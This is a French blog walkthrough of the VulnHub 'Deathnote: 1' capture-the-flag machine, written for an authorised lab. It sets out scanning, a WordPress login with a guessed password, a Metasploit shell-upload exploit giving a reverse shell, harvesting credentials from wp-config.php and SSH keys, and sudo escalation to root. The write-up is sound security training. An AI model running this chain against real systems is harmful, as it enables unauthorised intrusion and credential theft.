---
title: "CTF Deathnote: 1"
date: 2021-09-13
tags: ["Pentest", "CTF"]
download: https://www.vulnhub.com/entry/deathnote-1,739
---

## Avant propos

Le déroulé de ce hack a été réalisé sur une machine prévue à cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propriétaire.  
Ce CTF a été réalisé avec une machine attaquante **Kali 2021.2** (`lsb_release -r`).

## Enumération

On récupère l'adresse IP de la machine distante avec **Netdiscover** `sudo netdiscover`.  
Avant de poursuivre, on exporte cette adresse dans une variable pour être tranquille par la suite `export IP=192.168.1.19`.  
Puis on créé un dossier dédié à ce CTF `cd Documents/ctf && mkdir Deathnote1 && cd Deathnote1`.  
On lance **Nmap** pour scanner les ports de la machine distante.

```bash
$ nmap -sV -sT -p- $IP -oN nmap.txt
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
```

On un serveur **SSH** sur le port **22** et un serveur Apache 2.4.38 sur le port **80**.

En voulant accéder au site, on peut constater qu'il faut modifier le fichier **hosts** pour lui assigner le domaine "deathnote.vuln".

```bash
$ sudo vim /etc/hosts
192.168.1.19    deathnote.vuln
```

Sur la page **Wordpress**, on voit que c'est l'utilisateur "kira" qui a rédigé l'article et en scrollant, on tombe sur ce message "my fav line is iamjustic3". Sur la page de login [http://deathnote.vuln/wordpress/wp-login.php](http://deathnote.vuln/wordpress/wp-login.php), on rentre "kira" et le mot de passe, par déduction "iamjustic3".

## Pénétration

Pour se connecter à la machine, on peut utiliser l'outil **metasploit** pour lancer l'exploit "wp_admin_shell_upload" qui va exécuter un reverse shell.

```bash
$ msfconsole
msf6 > use exploit/unix/webapp/wp_admin_shell_upload
msf6 exploit(unix/webapp/wp_admin_shell_upload) > show options
```

On renseigne l'adresse de destination.

```bash
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set RHOSTS 192.168.1.19
RHOSTS => 192.168.1.19
```

Puis le chemin de **Wordpress**.

```bash
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set TARGETURI /wordpress
TARGETURI => /wordpress
```

Puis le nom de l'utilisateur.

```bash
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME kira
USERNAME => kira
```

Puis le mot de passe.

```bash
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set PASSWORD iamjustic3
PASSWORD => iamjustic3
```

Et on lance l'exploit.

```bash
msf6 exploit(unix/webapp/wp_admin_shell_upload) > run
```

Le script s'exécute correctement. On est connecté au serveur.

```bash
$ meterpreter > shell
python -c 'import pty; pty.spawn("/bin/sh")'
```

On trouve un fichier avec du **brainfuck** dans le répertoire de l'utilisateur "l".

```bash
$ cat /home/l/user.txt
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++.<<++.>>+++++++++++.------------.+.+++++.---.<<.>>++++++++++.<<.>>--------------.++++++++.+++++.<<.>>.------------.---.<<.>>++++++++++++++.-----------.---.+++++++..<<.++++++++++++.------------.>>----------.+++++++++++++++++++.-.<<.>>+++++.----------.++++++.<<.>>++.--------.-.++++++.<<.>>------------------.+++.<<.>>----.+.++++++++++.-------.<<.>>+++++++++++++++.-----.<<.>>----.--.+++..<<.>>+.--------.<<.+++++++++++++.>>++++++.--.+++++++++.-----------------.
```

"i think u got the shell , but you wont be able to kill me -kira". De toute évidence, c'est une fausse piste.

En consultant le répertoire de l'utilisateur "kira", on trouve une info intéressante.

```bash
$ cat /home/kira/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDyiW87OWKrV0KW13eKWJir58hT8IbC6Z61SZNh4Yzm9XlfTcCytDH56uhDOqtMR6jVzs9qCSXGQFLhc6IMPF69YMiK9yTU5ahT8LmfO0ObqSfSAGHaS0i5A73pxlqUTHHrzhB3/Jy93n0NfPqOX7HGkLBasYR0v/IreR74iiBI0JseDxyrZCLcl6h9V0WiU0mjbPNBGOffz41CJN78y2YXBuUliOAj/6vBi+wMyFF3jQhP4Su72ssLH1n/E2HBimD0F75mi6LE9SNuI6NivbJUWZFrfbQhN2FSsIHnuoLIJQfuFZsQtJsBQ9d3yvTD2k/POyhURC6MW0V/aQICFZ6z l@deathnote
```

Cela signifie que l'utilisateur "l" est enregistré dans **SSH** pour se connecter au compte de "kira".

On retrouve le mot de passe de l'utilisateur "l" dans le fichier de configuration de **Wordpress**.

```bash
$ cat /var/www/deathnote.vuln/wordpress/wp-config.php
/** MySQL database username */
define( 'DB_USER', 'l' );

/** MySQL database password */
define( 'DB_PASSWORD', 'death4me' );
```

On peut désormais se connecter avec cet utilisateur.

```bash
ssh l@$IP
l@192.168.1.19's password: death4me
```

## Escalation

Puis se connecter avec le compte "kira" sans spécifier de mot de passe.

```bash
$ ssh kira@localhost
$ id
uid=1001(kira) gid=1001(kira) groups=1001(kira),27(sudo)
```

On trouve le premier flag.

```bash
$ cat kira.txt
cGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp
```

En farvouillant partout, on trouve dans le répertoire "/opt", un dossier "L" avec un indice

```bash
$ cat /opt/L/fake-notebook-rule/hint
use cyberchef
```

Puis on consulte le fichier concerné.

```bash
$ cat /opt/L/fake-notebook-rule/case.wav
63 47 46 7a 63 33 64 6b 49 44 6f 67 61 32 6c 79 59 57 6c 7a 5a 58 5a 70 62 43 41 3d
```

Sur [cyberchef](https://gchq.github.io/CyberChef/), en décodant cette chaine hexadécimal, on trouve la valeur en **Base64** `cGFzc3dkIDoga2lyYWlzZXZpbCA=` que l'on décode avec la ligne de commande ci-dessous.

```bash
$ echo 'cGFzc3dkIDoga2lyYWlzZXZpbCA=' | base64 -d
passwd : kiraisevil
```

On a bien le mot de passe de l'utilisateur donc on peut consulter ses privilèges.

```bash
$ sudo -l
[sudo] password for kira: 
Matching Defaults entries for kira on deathnote:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User kira may run the following commands on deathnote:
    (ALL : ALL) ALL
```

L'utilisateur a tous les droits.

```bash
$ sudo bash
$ id
uid=0(root) gid=0(root) groups=0(root)
$ cat /root/root.txt
```

## Préambule

Il existait une autre voie lors de l'énumération pour trouver le mot de passe de l'utilisateur "l". En effet, dans les fichiers d'upload, il y a un fichier contenant une liste de mots de passe à l'adresse suivante [http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/notes.txt](http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/notes.txt). Ainsi, on aurait pu retrouver le mot de passe via l'outil de brute force **Hydra**.
